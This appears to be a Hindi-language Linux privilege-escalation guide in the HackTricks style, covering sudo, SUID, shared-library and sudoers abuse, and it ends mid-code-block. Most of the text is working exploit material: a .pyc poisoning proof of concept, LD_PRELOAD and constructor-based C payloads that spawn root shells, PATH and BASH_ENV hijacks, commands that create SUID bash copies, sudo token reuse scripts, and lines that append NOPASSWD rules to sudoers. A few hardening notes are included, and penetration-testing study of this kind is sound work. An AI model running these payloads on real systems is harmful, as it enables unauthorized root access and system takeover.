अगर कोई **sudo-allowed Python script** ऐसे module को import करती है जिसके package directory में **writable `__pycache__`** है, तो आप cached `.pyc` को बदलकर अगले import पर privileged user के रूप में code execution पा सकते हैं।<sup>[[30]](#references)</sup>

- यह क्यों काम करता है:
  - CPython bytecode caches को `__pycache__/module.cpython-<ver>.pyc` में रखता है।<sup>[[31]](#references)</sup>
  - Interpreter **header** (magic + source से जुड़े timestamp/hash metadata) को validate करता है, फिर उस header के बाद stored marshaled code object को execute करता है।
  - अगर directory writable होने के कारण आप cached file को **delete और recreate** कर सकते हैं, तो root-owned लेकिन non-writable `.pyc` को भी बदला जा सकता है।
- आम path:
  - `sudo -l` में कोई Python script या wrapper दिखता है, जिसे आप root के रूप में चला सकते हैं।
  - वह script `/opt/app/`, `/usr/local/lib/...` आदि से कोई local module import करती है।
  - उस imported module की `__pycache__` directory आपके user के लिए या सभी के लिए writable है।

त्वरित enumeration:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

यदि आप privileged script का निरीक्षण कर सकते हैं, तो imported modules और उनके cache path की पहचान करें:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Abuse workflow:

1. sudo-allowed script को एक बार चलाएँ, ताकि Python legit cache file बना सके, अगर वह पहले से मौजूद नहीं है।
2. legit `.pyc` से पहले 16 bytes पढ़ें और उन्हें poisoned file में फिर से इस्तेमाल करें।
3. एक payload code object compile करें, `marshal.dumps(...)` चलाएँ, मूल cache file delete करें और उसे original header तथा आपके malicious bytecode के साथ फिर से बनाएँ।
4. sudo-allowed script को फिर से चलाएँ, ताकि import आपका payload root के रूप में execute करे।

महत्वपूर्ण बातें:

- Original header को फिर से इस्तेमाल करना अहम है, क्योंकि Python cache metadata को source file से मिलाता है, यह नहीं जाँचता कि bytecode body वास्तव में source से मेल खाती है या नहीं।
- यह खास तौर पर तब उपयोगी है, जब source file root-owned हो और उसमें लिखने की अनुमति न हो, लेकिन उसे रखने वाली `__pycache__` directory writable हो।
- `PYTHONDONTWRITEBYTECODE=1` और `python -B` Python को नई `.pyc` files लिखने से रोकते हैं; वे उसे पहले से मौजूद, attacker द्वारा बदली गई cache load करने से **नहीं** रोकते। अहम सीमा यह है कि क्या कम privileges वाला user ऐसी cache को बदल सकता है जिसे privileged import स्वीकार करेगा। Python cached bytecode load करने से पहले timestamp/size या hash metadata जाँचता है। [Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) और [command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE) देखें।

न्यूनतम proof-of-concept संरचना:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- सुनिश्चित करें कि privileged Python import path में कोई भी directory low-privileged users द्वारा writable न हो, इसमें `__pycache__` भी शामिल है।
- Cache-directory के ownership और permissions का audit करें, इसमें मौजूदा `.pyc` files भी शामिल हैं। Bytecode writes को disable करने से नए cache बनने कम हो सकते हैं, लेकिन इससे बदला जा सकने वाला मौजूदा cache निष्प्रभावी नहीं होता।
- Writable local Python modules और writable cache directories को उसी तरह मानें, जैसे root द्वारा execute की जाने वाली writable shell scripts या shared libraries को मानते हैं।

### sudo env_keep के ज़रिए BASH_ENV संरक्षित → root shell

अगर sudoers `BASH_ENV` को संरक्षित रखता है (जैसे, `Defaults env_keep+="ENV BASH_ENV"`), तो किसी अनुमत command को चलाते समय root के रूप में arbitrary code चलाने के लिए Bash के non-interactive startup behavior का लाभ उठाया जा सकता है।<sup>[[24]](#references)</sup>

- यह क्यों काम करता है: Non-interactive shells के लिए, Bash target script चलाने से पहले `$BASH_ENV` को evaluate करता है और उस file को source करता है। कई sudo rules किसी script या shell wrapper को चलाने की अनुमति देते हैं। अगर sudo द्वारा `BASH_ENV` संरक्षित है, तो आपकी file root privileges के साथ source होती है।<sup>[[23]](#references)</sup>

- Requirements:
  - ऐसा sudo rule जिसे आप चला सकें (कोई भी target जो `/bin/bash` को non-interactively invoke करता हो, या कोई भी bash script)।
  - `BASH_ENV` का `env_keep` में मौजूद होना (`sudo -l` से जाँचें)।

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Hardening:
  - `env_keep` से `BASH_ENV` (और `ENV`) हटाएँ; `env_reset` को प्राथमिकता दें।
  - `sudo`-अनुमत commands के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
  - संरक्षित env vars के उपयोग पर `sudo` I/O logging और alerting पर विचार करें।

### sudo के ज़रिए Terraform, संरक्षित HOME के साथ (!env_reset)

जब `sudo` किसी अधिक privileged user के रूप में Terraform चलाने की अनुमति देता है, तो `!env_reset` इस बात की जाँच करने का संकेत है कि उस विशिष्ट rule में वास्तव में कौन-से environment variables बने रहते हैं। caller-writable `.terraformrc` या `terraform.rc` को सक्रिय CLI configuration मानने से पहले, प्रभावी `HOME` या `TF_CLI_CONFIG_FILE` की पुष्टि करें। `provider_installation.dev_overrides` entry तभी मायने रखती है, जब तय Terraform command उस provider को load करे और caller चुनी गई directory में उसका executable रख सके।<sup>[[25]](#references)</sup>

- आवश्यक provider को writable directory पर point करें और provider के नाम पर एक malicious plugin रखें (जैसे, `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform Go plugin handshake में fail हो जाएगा, लेकिन बंद होने से पहले payload को root के रूप में execute करेगा और पीछे एक SUID shell छोड़ जाएगा।

### TF_VAR overrides + symlink validation bypass

अगर sudo का विशेष rule इन्हें preserve करता है, तो Terraform variables `TF_VAR_<name>` environment variables के ज़रिए दिए जा सकते हैं। Source-symlink से **read** करने के लिए ऐसे provider की भी ज़रूरत होती है जो link को follow करे और protected result को caller-readable destination पर copy करे। Destination-symlink से **write** करने के लिए अलग से caller-controlled destination entry और ऐसा privileged provider चाहिए जो write करते समय उसे follow करे; बाद में scheduled job चलना इसका सिर्फ़ एक संभावित परिणाम है। इनमें से किसी भी route को test करने से पहले, `sudo -l`, `stat` और `readlink` जैसे read-only commands से सटीक sudo grant, संबंधित `.tf` files, चुनी गई CLI config और path ownership जाँचें। `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` जैसे कमज़ोर lexical validations symlinks को resolve नहीं करते:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform symlink को resolve करता है और असली `/root/root.txt` को हमलावर द्वारा पढ़े जा सकने वाले destination में कॉपी करता है। इसी तरीके का उपयोग पहले से destination symlinks बनाकर privileged paths में **लिखने** के लिए भी किया जा सकता है (उदाहरण के लिए, provider के destination path को `/etc/cron.d/` के अंदर किसी path की ओर point करके)।

### requiretty / !requiretty

कुछ पुराने distributions पर, sudo को `requiretty` के साथ configure किया जा सकता है, जो sudo को केवल interactive TTY से चलाने की अनुमति देता है। यदि `!requiretty` सेट है (या यह option मौजूद नहीं है), तो sudo को reverse shells, cron jobs या scripts जैसे non-interactive contexts से execute किया जा सकता है।

```bash
Defaults !requiretty
```

यह अपने आप में कोई सीधी vulnerability नहीं है, लेकिन इससे वे परिस्थितियाँ बढ़ जाती हैं जिनमें full PTY की ज़रूरत के बिना sudo rules का दुरुपयोग किया जा सकता है।

### Sudo env_keep+=PATH / असुरक्षित secure_path → PATH hijack

अगर `sudo -l` में `env_keep+=PATH` दिखता है या `secure_path` में attacker के लिखने योग्य entries (जैसे, `/home/<user>/bin`) हैं, तो sudo-अनुमत target के भीतर बिना पूर्ण path वाले external command को shadow किया जा सकता है।<sup>[[3]](#references)</sup> प्रभावी `secure_path` का न होना भी जाँचने योग्य है **यदि** command का sudo environment caller द्वारा नियंत्रित `PATH` को बनाए रखता है; केवल इसका न होना यह साबित नहीं करता कि ऐसा होता है। Script को चलाए बिना पढ़ें, फिर सटीक RunAs और argument rule, प्रभावी command search path, और command name वाली ऐसी पहले खोजी जाने वाली directory की पुष्टि करें जिस पर लिखने और traverse करने की अनुमति हो। Authentication, `NOEXEC`, shell builtins और absolute command paths नतीजे को बदल सकते हैं।

- आवश्यकताएँ: ऐसा sudo rule (अक्सर `NOPASSWD`) जो ऐसी script/binary चलाता हो जो बिना absolute paths (`free`, `df`, `ps` आदि) के commands call करती हो, और `PATH` में ऐसी writable entry हो जिसे सबसे पहले खोजा जाता हो।

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo execution में paths को bypass करना
दूसरी files पढ़ने या **symlinks** इस्तेमाल करने के लिए **Jump** करें। उदाहरण के लिए, sudoers file में: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

यदि **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान है:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary बिना command path

अगर **sudo permission** किसी एक command को **path बताए बिना** दी गई है: _hacker10 ALL= (root) less_, तो आप PATH variable बदलकर इसका exploit कर सकते हैं.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

इस तकनीक का इस्तेमाल तब भी किया जा सकता है, जब कोई **suid** binary **किसी अन्य command को उसका path बताए बिना execute करती है (किसी अजीब SUID binary के content को हमेशा** _**strings**_ **से check करें)**।

[Payload examples to execute.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Command path वाला SUID binary

अगर **suid** binary **path बताकर किसी अन्य command को execute करती है**, तो आप उस command के नाम से **एक function export करने** की कोशिश कर सकते हैं, जिसे suid file call कर रही है।

उदाहरण के लिए, अगर कोई suid binary _**/usr/sbin/service apache2 start**_ को call करती है, तो आपको function बनाकर उसे export करने की कोशिश करनी होगी:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

फिर, जब आप suid binary को call करेंगे, तो यह function execute होगा

### कस्टम SUID copy wrappers

एक root-owned SUID utility, जो source और destination paths स्वीकार करती है, दो अलग-अलग trust boundaries को पार कर सकती है। यदि यह किसी argument से shell command बनाती है (उदाहरण के लिए, `system()` को एक निर्मित `cp` command देना), तो shell metacharacters इसके effective privileges के साथ कोई दूसरा command execute कर सकते हैं। भले ही यह shell के बिना सुरक्षित रूप से `cp` invoke करे, unrestricted destination के कारण `/etc/passwd` जैसी files में arbitrary privileged write हो सकता है। Wrapper के argument handling, effective UID behavior, destination restrictions और इस बात की जाँच करें कि copied file में caller द्वारा नियंत्रित contents बने रहते हैं या नहीं; generic `cp` error या केवल SUID bit इनमें से किसी भी स्थिति का प्रमाण नहीं है। किसी भी manual testing से पहले binary और permissions को passive तरीके से enumerate करें।

### SUID wrapper द्वारा execute की जाने वाली writable script

एक आम custom-app misconfiguration में root-owned SUID binary wrapper एक script execute करता है, जबकि वह script low-priv users द्वारा writable होती है।

सामान्य pattern:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

यदि `/usr/local/bin/backup.sh` writable है, तो आप उसमें payload commands जोड़कर SUID wrapper चला सकते हैं:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

त्वरित जाँच:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

यह attack path खास तौर पर `/usr/local/bin` में उपलब्ध “maintenance”/“backup” wrappers में आम है।

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable का उपयोग एक या अधिक shared libraries (.so files) निर्दिष्ट करने के लिए किया जाता है, जिन्हें loader अन्य सभी libraries से पहले लोड करता है, जिसमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को library preloading कहा जाता है।

हालाँकि, system security बनाए रखने और इस feature के दुरुपयोग को रोकने के लिए, विशेषकर **suid/sgid** executables के मामले में, system कुछ शर्तें लागू करता है:

- यदि executable के लिए real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते, तो loader **LD_PRELOAD** को अनदेखा करता है।
- suid/sgid वाले executables के लिए, केवल standard paths में मौजूद वे libraries preload की जाती हैं जिन पर suid/sgid भी सेट हो।

यदि आप `sudo` के साथ commands चलाने में सक्षम हैं और `sudo -l` के output में **env_keep+=LD_PRELOAD** कथन शामिल है, तो privilege escalation हो सकता है। यह configuration **LD_PRELOAD** environment variable को बनाए रखने और `sudo` के साथ commands चलाने पर भी पहचाने जाने की अनुमति देती है, जिससे संभावित रूप से elevated privileges के साथ arbitrary code चलाया जा सकता है।<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

इस रूप में सहेजें **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

फिर इसे निम्नलिखित का उपयोग करके **compile** करें:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

अंत में, **escalate privileges** चलाएँәыҷ

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> अगर हमलावर **LD_LIBRARY_PATH** env variable को नियंत्रित करता है, तो इसी तरह के privesc का दुरुपयोग किया जा सकता है, क्योंकि वह उस path को नियंत्रित करता है जहाँ libraries खोजी जाएँगी।

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

जब कोई असामान्य **SUID** permissions वाला binary मिले, तो यह जाँचना अच्छा रहता है कि वह **.so** files को सही तरीके से load कर रहा है या नहीं। इसे निम्न command चलाकर जाँचा जा सकता है:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि मिलने पर exploitation की संभावना हो सकती है।

इसका exploitation करने के लिए, _"/path/to/.config/libcalc.c"_ नाम की C फ़ाइल बनाकर उसमें निम्नलिखित code लिखा जा सकता है:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

यह कोड compile और execute किए जाने के बाद, file permissions में बदलाव करके और elevated privileges के साथ shell चलाकर privileges बढ़ाने का लक्ष्य रखता है।

ऊपर दी गई C file को shared object (.so) file में compile करें:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

अंततः, प्रभावित SUID binary चलाने से exploit ट्रिगर होना चाहिए, जिससे संभावित system compromise हो सकता है।

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

अब जब हमें ऐसा SUID binary मिल गया है जो उस फ़ोल्डर से library लोड करता है जिसमें हम लिख सकते हैं, तो आवश्यक नाम वाली library उस फ़ोल्डर में बनाते हैं:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

यदि आपको इस तरह की कोई त्रुटि मिले:

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

इसका मतलब है कि आपके द्वारा बनाई गई library में `a_function_name` नाम का एक function होना चाहिए।

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries की एक चुनी हुई सूची है, जिनका इस्तेमाल attacker स्थानीय security restrictions को bypass करने के लिए कर सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) भी ऐसी ही सूची है, लेकिन उन मामलों के लिए जहाँ आप किसी command में **सिर्फ arguments inject कर सकते हैं**।

यह project Unix binaries के वैध functions इकट्ठा करता है, जिनका दुरुपयोग restricted shells से बाहर निकलने, elevated privileges बढ़ाने या बनाए रखने, files transfer करने, bind और reverse shells शुरू करने, और अन्य post-exploitation कार्यों में मदद के लिए किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

अगर आप `sudo -l` access कर सकते हैं, तो [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) tool का इस्तेमाल करके जाँच सकते हैं कि क्या यह किसी sudo rule का exploit करने का तरीका ढूँढ़ता है।

### Sudo Tokens का पुनः उपयोग

ऐसे मामलों में जहाँ आपके पास **sudo access** है, लेकिन password नहीं है, आप **sudo command के चलने की प्रतीक्षा करके और फिर session token hijack करके** privileges बढ़ा सकते हैं।<sup>[[18]](#references)</sup>

Privileges बढ़ाने की आवश्यकताएँ:

- आपके पास पहले से user "_sampleuser_" के रूप में shell है
- "_sampleuser_" ने **पिछले 15 मिनट में** कुछ चलाने के लिए `sudo` का इस्तेमाल किया हो (डिफ़ॉल्ट रूप से sudo token की अवधि इतनी होती है, जिसके दौरान हम कोई password डाले बिना `sudo` इस्तेमाल कर सकते हैं)
- `cat /proc/sys/kernel/yama/ptrace_scope` का मान 0 हो
- `gdb` उपलब्ध हो (आप इसे upload कर सकें)

(आप `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` चलाकर `ptrace_scope` को अस्थायी रूप से enable कर सकते हैं, या `/etc/sysctl.d/10-ptrace.conf` में बदलाव करके और `kernel.yama.ptrace_scope = 0` सेट करके इसे स्थायी रूप से enable कर सकते हैं।)

अगर ये सभी आवश्यकताएँ पूरी होती हैं, तो **आप इस tool का इस्तेमाल करके privileges बढ़ा सकते हैं:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **पहला exploit** (`exploit.sh`) _/tmp_ में `activate_sudo_token` binary बनाएगा। आप इसका इस्तेमाल **अपने session में sudo token activate करने के लिए** कर सकते हैं (आपको अपने आप root shell नहीं मिलेगा, `sudo su` चलाएँ):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में **root के स्वामित्व वाला setuid sh shell** बनाएगा.

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **तीसरा exploit** (`exploit_v3.sh`) एक **sudoers file बनाएगा**, जो **sudo tokens को हमेशा के लिए वैध बना देगा और सभी users को sudo इस्तेमाल करने की अनुमति देगा**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

अगर आपके पास फ़ोल्डर में या फ़ोल्डर के अंदर बनाई गई किसी भी फ़ाइल पर **लिखने की अनुमति** है, तो आप किसी user और PID के लिए **sudo token बनाने** हेतु binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग कर सकते हैं।\
उदाहरण के लिए, अगर आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास PID 1234 वाले उस user का shell है, तो आप पासवर्ड जाने बिना **sudo privileges प्राप्त** कर सकते हैं:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें कॉन्फ़िगर करती हैं कि `sudo` का इस्तेमाल कौन कर सकता है और कैसे। ये फ़ाइलें **डिफ़ॉल्ट रूप से केवल user root और group root द्वारा पढ़ी जा सकती हैं**।\
**अगर** आप इस फ़ाइल को **पढ़** सकते हैं, तो आपको **कुछ दिलचस्प जानकारी मिल सकती है**, और अगर आप कोई फ़ाइल **लिख** सकते हैं, तो आप **privileges escalate** कर पाएँगे।

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

अगर आप लिख सकते हैं, तो आप इस अनुमति का दुरुपयोग कर सकते हैं।

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

इन अनुमतियों का दुरुपयोग करने का एक और तरीका:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

`sudo` binary के कुछ विकल्प भी हैं, जैसे OpenBSD के लिए `doas`। इसकी configuration `/etc/doas.conf` में देखना याद रखें।

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

यदि `doas` किसी editor या interpreter की अनुमति देता है, तो GTFOBins-style escapes की जाँच करें:

```bash
doas vim
:!/bin/sh
```

मूल Python-आधारित `dstat` के लिए root-सक्षम `doas` नियम में plugin-path की भी जाँच करना उचित है। इसके [manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) और [source](https://github.com/dstat-real/dstat/blob/master/dstat) में `dstat_*.py` plugins के स्थानों में `/usr/share/dstat/` और `/usr/local/share/dstat/` भी सूचीबद्ध हैं। यदि मौजूदा user उस स्थान में लिख सकता है और उसे search कर सकता है जिसका installed build वास्तव में उपयोग करता है, तो चुना गया plugin `doas` की RunAs identity के साथ चल सकता है। प्रभावी नियम, उस build में plugin lookup, directory और parent की permissions या ACLs, और यह पुष्टि करें कि caller plugin चुन सकता है या नहीं; केवल `dstat` नियम या writable directory मिलना जाँच का संकेत भर है। `dstat` के अन्य implementations अलग plugin systems इस्तेमाल कर सकते हैं। Plugin लोड किए बिना metadata का निरीक्षण करें।

### Sudo Hijacking

यदि आपको पता है कि कोई **user आम तौर पर किसी मशीन से जुड़ता है और privileges बढ़ाने के लिए `sudo` का उपयोग करता है**, और आपको उस user के context में shell मिल गया है, तो आप **एक नया sudo executable बना सकते हैं**, जो आपका code root के रूप में और फिर user की command चलाएगा। इसके बाद, **user context का $PATH संशोधित करें** (उदाहरण के लिए, `.bash_profile` में नया path जोड़कर), ताकि user के sudo चलाने पर आपका sudo executable चले।

ध्यान दें कि यदि user कोई दूसरा shell (bash नहीं) इस्तेमाल करता है, तो नया path जोड़ने के लिए आपको दूसरी files संशोधित करनी होंगी। उदाहरण के लिए[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को संशोधित करता है। एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में मिल सकता है।

या कुछ इस तरह चलाकर:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Shared Library

### ld.so

फ़ाइल `/etc/ld.so.conf` बताती है कि **लोड की गई configuration फ़ाइलें कहाँ से आती हैं**। आमतौर पर, इस फ़ाइल में यह path होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` की configuration फ़ाइलें पढ़ी जाएँगी। ये configuration फ़ाइलें **दूसरे folders की ओर संकेत करती हैं**, जहाँ **libraries को खोजा** जाएगा। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि system, `/usr/local/lib` के अंदर libraries खोजेगा**।

अगर किसी कारण से **किसी user के पास** इनमें से किसी भी path पर **लिखने की अनुमति** है: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी फ़ाइल, या `/etc/ld.so.conf.d/*.conf` के अंदर configuration फ़ाइल में दिया गया कोई भी folder, तो वह privileges escalate कर सकता है।\
इस misconfiguration का **शोषण कैसे करें**, यह देखने के लिए यह page देखें:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

`lib` को `/var/tmp/flag15/` में कॉपी करने पर, `RPATH` variable में निर्दिष्ट इस स्थान की `lib` का उपयोग program करेगा।

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

इसके बाद `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` का उपयोग करके एक malicious library बनाएँ.

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## क्षमताएँ

Linux capabilities किसी process को उपलब्ध root privileges का **एक subset प्रदान करती हैं**। इससे root **privileges छोटे और अलग-अलग units में विभाजित हो जाते हैं**। फिर इनमें से हर unit को स्वतंत्र रूप से processes को दिया जा सकता है। इस तरह privileges का पूरा set कम हो जाता है, जिससे exploitation के जोखिम घटते हैं।\
Capabilities और उनका दुरुपयोग करने के तरीकों के बारे में **और जानने के लिए** यह पेज पढ़ें:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## डायरेक्टरी अनुमतियाँ

किसी डायरेक्टरी में **"execute" bit** का अर्थ है कि प्रभावित user फ़ोल्डर में "**cd**" कर सकता है।\
**"read" bit** का अर्थ है कि user **files** की सूची देख सकता है, और **"write" bit** का अर्थ है कि user नई **files** बना और मौजूदा **files** हटा सकता है।

## ACLs

Access Control Lists (ACLs), discretionary permissions की द्वितीयक layer हैं, जो **पारंपरिक ugo/rwx permissions को override कर सकती हैं**। ये permissions उन विशिष्ट users को अधिकार देने या उनसे अधिकार रोकने की सुविधा देकर file या डायरेक्टरी तक पहुँच पर नियंत्रण बढ़ाती हैं, जो owner नहीं हैं या उस group के सदस्य नहीं हैं। नियंत्रण का यह **सूक्ष्म स्तर अधिक सटीक access management सुनिश्चित करता है**। अधिक जानकारी [**यहाँ**](https://linuxconfig.org/how-to-manage-acls-on-linux) मिल सकती है।<sup>[[19]](#references)</sup>

किसी file पर user "kali" को read और write permissions **दें**:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**सिस्टम से विशिष्ट ACLs वाली फ़ाइलें प्राप्त करें:**

```bash
